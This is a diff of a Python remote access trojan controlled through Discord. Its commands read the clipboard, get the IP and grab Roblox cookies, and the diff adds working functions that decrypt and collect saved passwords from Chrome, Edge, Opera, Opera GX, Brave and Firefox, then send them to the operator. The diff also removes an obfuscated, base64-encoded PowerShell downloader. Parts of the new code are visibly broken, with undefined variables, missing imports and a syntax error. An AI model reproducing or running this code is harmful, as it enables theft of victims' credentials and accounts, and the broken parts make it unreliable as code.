@@ -1,7 +1,6 @@
 import pyautogui, cv2, time, threading, win32api, discord, requests,base64, os, json, psutil, ctypes,win32crypt, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, inspect, urllib, shutil
 from discord.ext import commands
 from Crypto.Cipher import AES
-from gtts import gTTS
 from ctypes import Structure, c_uint
 from re import findall
 
@@ -83,7 +82,7 @@ Available commands for **{os.getlogin()}** :
 **!whois** - Prints the user"s name
 **!getip** - Gets the current user's IP address
 **!clipboard** - Returns a string of the user's clipboard.
-**!stealpasswords** - Steal all the passwords from the device.
+**!grabpasswords** - Steal all the passwords from the device.
 **!grabroblox** - Grabs the user's Roblox account cookie.
 **!hardware_list** - Lists the user's hardware on newlines.
 """
@@ -327,26 +326,309 @@ async def clipboard(ctx, *, usid):
         current_clipboard = str(pyperclip.paste())
         await ctx.send(f"Clipboard content for **{os.getlogin()}** is : \n\n{current_clipboard}")
 
-def _shellpw(command):
-    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    global status
-    status = "ok"
-    return output.stdout.decode('CP437').strip()
+
+def my_chrome_datetime(time_in_mseconds):
+    return dt(1601, 1, 1) + timedelta(microseconds=int(time_in_mseconds))
+
+def encryption_key(browser):
+    localState_path = None
+    if browser == "Chrome":
+        localState_path = os.path.join(os.environ["USERPROFILE"],
+                                       "AppData", "Local", "Google", "Chrome",
+                                       "User Data", "Local State")
+    elif browser == "Edge":
+        localState_path = os.path.join(os.environ["USERPROFILE"],
+                                       "AppData", "Local", "Microsoft", "Edge",
+                                       "User Data", "Local State")
+    elif browser == "Opera GX":
+        localState_path = os.path.join(os.environ["APPDATA"],
+                                       "Opera Software", "Opera GX Stable",
+                                       "Local State")
+    elif browser == "Opera":
+        localState_path = os.path.join(os.environ["APPDATA"],
+                                       "Opera Software", "Opera Stable",
+                                       "Local State")
+
+    elif browser == "Brave":
+        localState_path = os.path.join(os.environ["LOCALAPPDATA"],
+                                       "BraveSoftware", "Brave-Browser",
+                                       "User Data", "Local State")
+    
+    with open(localState_path, "r", encoding="utf-8") as file:
+        local_state_file = file.read()
+        local_state_file = json.loads(local_state_file)
+    
+    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decrypted key
+
+def decrypt_password(enc_password, key, browser):
+    try:
+        init_vector = enc_password[3:15]
+        enc_password = enc_password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, init_vector)
+        return cipher.decrypt(enc_password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1])
+        except:
+            return "No passwords available (logged in with social account)"
+
+def steal_chrome_passwords():
+    password_db_path = []
+
+    if os.path.exists(f"{os.getenv('userprofile')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"):
+        password_db_path.append(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"))
+    else:
+        return {}
+
+    for file in os.listdir(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")):
+        if file.startswith("Profile"):
+            profile_number = file
+            password_db_path.append(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", profile_number, "Login Data"))
+
+    all_data = {}
+
+    for password_path in password_db_path:
+        shutil.copyfile(password_path, "my_chrome_data.db")
+        db = sqlite3.connect("my_chrome_data.db")
+        cursor = db.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+        encp_key = encryption_key("Chrome")
+        data = {}
+        for row in cursor.fetchall():
+            try:
+                site_url = row[0]
+                username = row[1]
+                password = decrypt_password(row[2], encp_key, "Chrome")
+                date_created = row[3]
+                if username or password:
+                    if site_url not in data:
+                        data[site_url] = []
+                    data[site_url].append(
+                        {
+                            "username": username,
+                            "password": password,
+                            "date_created": str(my_chrome_datetime(date_created)),
+                        }
+                    )
+            except: pass
+        cursor.close()
+        db.close()
+        os.remove("my_chrome_data.db")
+
+        all_data.update(data)
+
+    return all_data
+
+
+def steal_firefox_passwords():
+    if not os.path.exists(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")):
+        return {}
+
+    profiles = os.listdir(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"))
+    stolen_data = {}
+
+    for profile in profiles:
+        if profile.endswith(".default"):
+            logins_path = os.path.join(os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"), profile, "logins.json")
+            if os.path.isfile(logins_path):
+                try:
+                    with open(logins_path, "r", encoding="utf-8") as file:
+                        logins_data = json.load(file)
+                        for login in logins_data["logins"]:
+                            site_url = login["hostname"]
+                            username = login["username"]
+                            password = login["password"]
+                            date_created = login["timeCreated"]
+                            if username or password:
+                                if site_url not in stolen_data:
+                                    stolen_data[site_url] = []
+                                stolen_data[site_url].append(
+                                    {
+                                        "username": username,
+                                        "password": password,
+                                        "date_created": str(my_chrome_datetime(date_created)),
+                                    }
+                                )
+                except: pass
+    return stolen_data
+
+def steal_edge_passwords():
+
+    if not os.path.exists(os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Login Data")):
+        return {}
+
+    encp_key = encryption_key("Edge") 
+
+    shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Login Data"), "my_edge_data.db")
+    db = sqlite3.connect("my_edge_data.db")
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+    data = {}
+    for row in cursor.fetchall():
+        try:
+            site_url = row[0]
+            username = row[1]
+            password = decrypt_password(row[2], encp_key, "Edge")
+            date_created = row[3]
+            if username or password:
+                if site_url not in data:
+                    data[site_url] = []
+                data[site_url].append(
+                    {
+                        "username": username,
+                        "password": password,
+                        "date_created": str(my_chrome_datetime(date_created)),
+                    }
+                )
+        except: pass
+    cursor.close()
+    db.close()
+    os.remove("my_edge_data.db")
+    return data
+
+def steal_opera_gx_passwords():
+
+    if not os.path.exists(f'{os.getenv("APPDATA")}\\Opera Software\\Opera GX Stable\\Login Data'):
+        return {}
+    
+    encp_key = encryption_key("Opera GX")
+
+    shutil.copyfile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable", "Login Data"), "my_opera_data.db")
+    db = sqlite3.connect("my_opera_data.db")
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+    data = {}
+    for row in cursor.fetchall():
+        try:
+            site_url = row[0]
+            username = row[1]
+            password = decrypt_password(row[2], encp_key, "Opera")
+            date_created = row[3]
+            if username or password:
+                if site_url not in data:
+                    data[site_url] = []
+                data[site_url].append(
+                    {
+                        "username": username,
+                        "password": password,
+                        "date_created": str(my_chrome_datetime(date_created)),
+                    }
+                )
+        except: pass
+    cursor.close()
+    db.close()
+    os.remove("my_opera_data.db")
+    return data
+
+def steal_brave_passwords():
+    if not os.path.exists(os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")):
+        return {}
+
+    encp_key = encryption_key("Brave")
+
+    shutil.copyfile(os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"), "my_brave_data.db")
+    db = sqlite3.connect("my_brave_data.db")
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+    data = {}
+    for row in cursor.fetchall():
+        try:
+            site_url = row[0]
+            username = row[1]
+            password = decrypt_password(row[2], encp_key, "Brave")
+            date_created = row[3]
+            if username or password:
+                if site_url not in data:
+                    data[site_url] = []
+                data[site_url].append(
+                    {
+                        "username": username,
+                        "password": password,
+                        "date_created": str(my_chrome_datetime(date_created)),
+                    }
+                )
+        except: pass
+    cursor.close()
+    db.close()
+    os.remove("my_brave_data.db")
+    return data
+
+def steal_opera_passwords():
+    if not os.path.exists(f'{os.getenv("APPDATA")}\\Opera Software\\Opera Stable\\Login Data'):
+        return {}
+    
+    encp_key = encryption_key("Opera")
+
+    shutil.copyfile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable", "Login Data"), "my_opera_data.db")
+    db = sqlite3.connect("my_opera_data.db")
+    cursor = db.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
+    data = {}
+    for row in cursor.fetchall():
+        try:
+            site_url = row[0]
+            username = row[1]
+            password = decrypt_password(row[2], encp_key, "Opera")
+            date_created = row[3]
+            if username or password:
+                if site_url not in data:
+                    data[site_url] = []
+                data[site_url].append(
+                    {
+                        "username": username,
+                        "password": password,
+                        "date_created": str(my_chrome_datetime(date_created)),
+                    }
+                )
+        except: pass
+    cursor.close()
+    db.close()
+    os.remove("my_opera_data.db")
+    return data
+
+def steal_passwords():
+    chrome_data = steal_chrome_passwords()
+    firefox_data = steal_firefox_passwords()
+    edge_data = steal_edge_passwords()
+    operagx_data = steal_opera_gx_passwords()
+    opera_data = steal_opera_passwords()
+    brave_data = steal_brave_passwords()
+
+    combined_data = {**chrome_data, **firefox_data, **edge_data, **operagx_data, **opera_data, **brave_data}
+
+    if len(combined_data) > 0:
+        return combined_data
+    else:
+        return {}
+
+
+
+def save_credentials_as_file(credentials_data):
+    filename = f"{os.getlogin()}-passwords.txt"
+    with open(filename, "w", encoding="utf8") as file:
+        for site_url, credentials_list in credentials_data.items():
+            file.write(f"Site URL: {site_url}\n")
+            for credentials in credentials_list:
+                file.write(f"Username: {credentials['username']}\n")
+                file.write(f"Password: {credentials['password']}\n")
+                file.write(f"Date Created: {credentials['date_created']}\n")
+            file.write("\n")
+    return filename
+    
 
 @client.command()
-async def stealpasswords(ctx, *, usid):
+async def grabpasswords(ctx):
     if usid == clientid:
-        postchannel = client.get_channel(int(pass_channel_id))
-        temp = os.getenv('temp')
-        passwords = _shellpw("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
-        f4 = open(temp + r"\passwords.txt", 'w')
-        f4.write(str(passwords))
-        f4.close()
-        file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
-        await ctx.send(f":skull_crossbones: Started fishing **{os.getlogin()}**'s passwords...")
-        await postchannel.send(f"{ctx.author.mention} Passwords for **{os.getlogin()}** ", file=file)
-        await ctx.send(f":white_check_mark: **{os.getlogin()}**'s passwords have been sent in <#{pass_channel_id}>")
-        os.remove(temp + r"\passwords.txt")
+        await ctx.send(f":hourglass: Started grabbing **{os.getlogin()}**'s passwords"
+        file_path = save_credentials_as_file(data)
+        try:
+            with open(file_path, "r", encoding="utf8") as file:
+                file_data = discord.File(file, filename="stolen_credentials.txt")
+        except Exception as e:
+            await ctx.send("Couldn't grab passwords for **{os.getlogin()}**: `{e}`")
+            return
+        await ctx.send(f":white_check_mark: Grabbed **{os.getlogin()}**'s passwords", file=file_data)
 
 
 @client.command()
